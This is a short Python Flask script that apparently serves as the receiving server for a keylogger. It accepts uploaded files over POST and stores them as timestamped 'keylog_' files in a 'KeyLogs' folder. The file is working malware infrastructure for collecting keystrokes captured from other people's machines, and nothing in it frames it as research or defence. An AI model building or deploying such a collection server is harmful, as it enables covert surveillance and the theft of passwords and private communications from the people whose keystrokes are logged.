#handling the post requests in the server side 

from flask import Flask, request
from datetime import datetime
import os

UPLOAD_FOLDER = "/KeyLogsDir"

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/',methods=['POST'])
def result():
    uploadedFile = request.files['file']
    path = "KeyLogs/"
    if not os.path.exists(path):
        os.makedirs(path)
    filename = "keylog_" + datetime.now().strftime("%d.%m.%Y_%H:%M:%S")
    with open(os.path.join(path, filename), 'wb') as f:
        uploadedFile.save(f)
    return "received"